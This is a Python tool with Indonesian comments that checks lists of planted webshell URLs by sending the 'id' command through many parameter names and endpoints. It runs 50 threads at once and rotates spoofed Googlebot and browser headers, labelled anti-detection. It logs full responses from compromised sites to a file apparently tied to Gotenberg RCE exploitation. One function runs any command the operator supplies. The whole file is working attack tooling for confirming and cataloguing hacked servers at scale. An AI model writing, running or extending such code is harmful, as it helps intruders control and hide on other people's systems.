#!/usr/bin/env python3
"""
RCE VERIFIER v1.1 — Verifikasi RCE yang benar-benar berhasil
=============================================================
Setiap exploit method wajib verify dengan execute command dan parse output.
Tidak ada lagi "attempt" yang return True tanpa bukti.

Saat RCE terbukti valid, LOG RESPONS HTTP lengkap dari website target
(status code + headers + body) disimpan ke gotenberg_rce.txt — bukan
sekadar string uid=...

Format ringkas di stdout: target | uid=... gid=... groups=...
"""

import os
import re
import time
import threading
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RCE_FILE = os.path.join(BASE_DIR, "gotenberg_rce.txt")
TIMEOUT = 10
VERIFY_TIMEOUT = 5
THREADS = 50
_SAVE_LOCK = threading.Lock()

# Anti-detection headers
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.duckduckgo.com/",
]


def get_headers():
    """Get anti-detection headers."""
    return {
        "User-Agent": USER_AGENTS[0],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
        "Connection": "keep-alive",
    }


def get_random_headers():
    """Get random anti-detection headers."""
    import random
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(REFERERS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
        "Connection": "keep-alive",
    }


# ═══════════════════════════════════════════════════════════════
# RESPONSE LOG — simpan respons HTTP asli website saat RCE valid
# ═══════════════════════════════════════════════════════════════

def build_response_log(target, cve, method, shell_url, r):
    """Bangun LOG RESPONS HTTP lengkap dari website target saat CVE RCE valid."""
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    lines = [
        "=" * 72,
        f"[{ts}] RCE VALID — {cve} ({method})",
        "=" * 72,
        f"target      : {target}",
        f"cve         : {cve}",
        f"method      : {method}",
        f"shell       : {shell_url}",
        f"http_status : {r.status_code} {getattr(r, 'reason', '') or ''}".rstrip(),
        f"request_url : {r.url}",
        f"elapsed     : {getattr(r, 'elapsed', '')}",
        "response_headers :",
    ]
    for k, v in r.headers.items():
        lines.append(f"    {k}: {v}")
    body = r.text or ""
    lines.append(f"response_body ({len(body)} bytes) :")
    lines.append(body[:8000] if body else "    <empty>")
    lines.append("")
    return "\n".join(lines)


def save_rce_log(block):
    """Append log respons RCE ke gotenberg_rce.txt (deduped per header blok)."""
    if not block:
        return
    parts = block.split("\n")
    header = parts[1].strip() if len(parts) > 1 else block.strip()
    with _SAVE_LOCK:
        existing = set()
        if os.path.exists(RCE_FILE):
            with open(RCE_FILE) as f:
                existing = {l.strip() for l in f if l.strip()}
        if header in existing:
            return
        with open(RCE_FILE, "a") as f:
            f.write(block.rstrip() + "\n")


# ═══════════════════════════════════════════════════════════════
# RCE VERIFICATION
# ═══════════════════════════════════════════════════════════════

def verify_rce_webshell(shell_url, timeout=VERIFY_TIMEOUT):
    """
    Verifikasi RCE dengan execute 'id' command via webshell.
    Saat valid, log respons HTTP lengkap disimpan ke gotenberg_rce.txt.
    Returns: (success: bool, identity: str)
    """
    # Try different command parameter names
    cmd_params = ['cmd', 'c', 'exec', 'command', 'run', 'do', 'action', 'execute']

    for param in cmd_params:
        try:
            # Try GET
            r = requests.get(
                f"{shell_url}?{param}=id",
                headers=get_random_headers(),
                timeout=timeout,
                verify=False,
                allow_redirects=True,
            )
            if r.status_code == 200:
                identity = parse_identity(r.text)
                if identity:
                    save_rce_log(build_response_log(
                        shell_url, "RCE-VERIFY", f"GET {param}=id", shell_url, r))
                    return True, identity

            # Try POST
            r = requests.post(
                shell_url,
                data={param: "id"},
                headers=get_random_headers(),
                timeout=timeout,
                verify=False,
                allow_redirects=True,
            )
            if r.status_code == 200:
                identity = parse_identity(r.text)
                if identity:
                    save_rce_log(build_response_log(
                        shell_url, "RCE-VERIFY", f"POST {param}=id", shell_url, r))
                    return True, identity
        except Exception:
            continue

    return False, ""


def verify_rce_blind(url, timeout=TIMEOUT):
    """
    Verifikasi RCE blind dengan execute command dan cek output.
    Untuk exploit yang tidak langsung return output.
    """
    # Try common RCE endpoints
    rce_endpoints = [
        f"{url}/cmd",
        f"{url}/exec",
        f"{url}/run",
        f"{url}/execute",
        f"{url}/command",
        f"{url}/shell",
        f"{url}/eval",
        f"{url}/system",
    ]

    for endpoint in rce_endpoints:
        try:
            r = requests.post(
                endpoint,
                data={"cmd": "id", "c": "id", "exec": "id"},
                headers=get_random_headers(),
                timeout=timeout,
                verify=False,
            )
            if r.status_code == 200:
                identity = parse_identity(r.text)
                if identity:
                    save_rce_log(build_response_log(
                        url, "RCE-VERIFY-BLIND", f"POST {endpoint}", endpoint, r))
                    return True, identity
        except Exception:
            continue

    return False, ""


def parse_identity(text):
    """
    Parse uid=/gid=/groups= dari output command 'id'.
    Returns: identity string or None
    """
    if not text:
        return None

    # Clean HTML tags
    clean = re.sub(r'<[^>]+>', '', text)

    # Match: uid=N(name) gid=N(name) groups=N(name),...
    m = re.search(
        r'(uid=\d+\([^)]*\)\s+gid=\d+\([^)]*\)(?:\s+groups=[^\n]*)?)',
        clean,
    )
    if m:
        identity = m.group(1).strip()
        # Clean trailing whitespace
        identity = re.sub(r'\s+$', '', identity)
        return identity

    # Partial match — at least uid=
    m2 = re.search(r'(uid=\d+\([^)]*\))', clean)
    if m2:
        return m2.group(1).strip()

    return None


def verify_rce_with_command(url, cmd="id", timeout=TIMEOUT):
    """
    Verifikasi RCE dengan execute command apapun.
    Returns: (success: bool, output: str)
    """
    # Try GET with query param
    try:
        r = requests.get(
            f"{url}?cmd={cmd}",
            headers=get_random_headers(),
            timeout=timeout,
            verify=False,
        )
        if r.status_code == 200 and len(r.text) > 5:
            return True, r.text[:500]
    except Exception:
        pass

    # Try POST
    try:
        r = requests.post(
            url,
            data={"cmd": cmd, "c": cmd, "exec": cmd},
            headers=get_random_headers(),
            timeout=timeout,
            verify=False,
        )
        if r.status_code == 200 and len(r.text) > 5:
            return True, r.text[:500]
    except Exception:
        pass

    return False, ""


# ═══════════════════════════════════════════════════════════════
# MASS VERIFICATION
# ═══════════════════════════════════════════════════════════════

def verify_rce_mass(shell_urls, threads=THREADS):
    """
    Verifikasi RCE untuk banyak shell URLs secara parallel.
    Returns: list of (url, success, identity)
    """
    results = []

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(verify_rce_webshell, url): url
            for url in shell_urls
        }

        for future in as_completed(futures):
            url = futures[future]
            try:
                success, identity = future.result()
                results.append((url, success, identity))
                if success:
                    print(f"[RCE] [+] {url} | {identity}")
                else:
                    print(f"[RCE] [-] {url} | failed")
            except Exception as e:
                results.append((url, False, str(e)[:50]))
                print(f"[RCE] [-] {url} | error: {str(e)[:50]}")

    return results


# ═══════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 rce_verifier.py <shell_url_or_file>")
        print("Example: python3 rce_verifier.py http://target.com/shell.php")
        print("Example: python3 rce_verifier.py shell.txt")
        sys.exit(1)

    target = sys.argv[1]

    # Check if file
    try:
        with open(target) as f:
            urls = [l.strip() for l in f if l.strip()]
        print(f"[RCE] Verifying {len(urls)} shells from {target}")
        results = verify_rce_mass(urls)

        # Summary
        success = sum(1 for _, s, _ in results if s)
        print(f"\n[RCE] ═══ SUMMARY ═══")
        print(f"[RCE] Success: {success}/{len(results)}")
        print(f"[RCE] Response logs: {RCE_FILE}")

        # Print successful
        for url, s, identity in results:
            if s:
                print(f"[RCE] [+] {url} | {identity}")
    except FileNotFoundError:
        # Single URL
        print(f"[RCE] Verifying: {target}")
        success, identity = verify_rce_webshell(target)
        if success:
            print(f"[RCE] [+] {target} | {identity}")
            print(f"[RCE] Response log: {RCE_FILE}")
        else:
            print(f"[RCE] [-] {target} | failed")
